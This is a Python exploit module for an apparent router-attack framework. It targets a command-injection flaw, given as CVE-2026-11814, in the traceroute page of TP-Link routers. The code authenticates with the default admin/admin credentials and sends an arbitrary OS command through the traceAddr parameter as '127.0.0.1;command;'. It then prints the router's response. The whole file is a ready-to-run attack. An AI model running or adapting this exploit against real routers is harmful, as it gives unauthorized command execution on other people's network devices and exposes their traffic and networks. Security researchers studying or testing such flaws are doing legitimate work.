# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import time
import urllib.parse
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TP-Link Traceroute Command Injection (CVE-2026-11814).

    The web management interface on TP-Link routers exposes a
    traceroute diagnostic endpoint at ``/userRpm/TraceRouteRpm.htm``.
    The ``traceAddr`` parameter is concatenated into a shell command
    without sanitization, enabling authenticated command injection.

    Unlike CVE-2026-3227 (ping endpoint), this variant requires the
    default admin credentials (admin/admin), which remain unchanged on
    the majority of deployed devices.

    CVSS v3.1: 8.0 (High), AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TP-Link Traceroute Command Injection (CVE-2026-11814)",
        "description": (
            "Exploits CVE-2026-11814 via command injection in the "
            "traceroute diagnostic endpoint of TP-Link routers. The "
            "traceAddr parameter is passed unsanitized to a shell "
            "command. Requires default admin credentials which are "
            "unchanged on most deployments."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-11814",
            "https://www.tp-link.com/us/support/download/",
        ),
        "disclosure_date": "2026-03-18",
        "platform": "linux",
        "arch": "mips",
        "privileged": True,
        "targets": (
            "TP-Link Archer C7 (firmware <= 2026.03)",
            "TP-Link Archer C20 (firmware <= 2026.03)",
            "TP-Link TL-WR940N (firmware <= 2026.03)",
        ),
    }

    target = OptIP("", "Target IPv4 address of the TP-Link router")
    port = OptPort(80, "Target HTTP port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via traceroute")
    username = OptString("admin", "HTTP Basic Auth username")
    password = OptString("admin", "HTTP Basic Auth password")

    _TRACE_PATH = "/userRpm/TraceRouteRpm.htm"

    def _build_url(self, path: str) -> str:
        return f"http://{self.target}:{self.port}{path}"

    def _http_get_auth(self, path: str, params: dict | None = None) -> tuple[int, str]:
        url = self._build_url(path)
        if params:
            url += "?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "Mozilla/5.0")
        import base64
        creds = base64.b64encode(
            f"{self.username}:{self.password}".encode()
        ).decode()
        req.add_header("Authorization", f"Basic {creds}")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", errors="replace")
        except Exception:
            return 0, ""

    @mute
    def check(self) -> bool:
        """Check if the traceroute endpoint is accessible with credentials."""
        try:
            status, body = self._http_get_auth(self._TRACE_PATH)
            if status == 200 and "trace" in body.lower():
                return True
            return status == 200
        except Exception:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Cannot access traceroute endpoint at "
                f"{self.target}:{self.port} with provided credentials"
            )
            return

        print_success("Traceroute endpoint accessible; injecting command")
        self._exploit()

    def _exploit(self) -> None:
        injected = f"127.0.0.1;{self.command};"

        params = {
            "traceAddr": injected,
            "doType": "tracert",
        }

        print_status(f"Injecting via traceAddr: {injected!r}")

        status, body = self._http_get_auth(self._TRACE_PATH, params)

        if status == 200:
            print_success(
                f"HTTP {status} returned. Command '{self.command}' "
                f"should have executed on the target."
            )
            if body.strip():
                for line in body[:2048].splitlines():
                    print_info(f"  {line}")
        elif status == 401:
            print_error("Authentication failed; check credentials")
        else:
            print_error(f"Unexpected HTTP {status}")
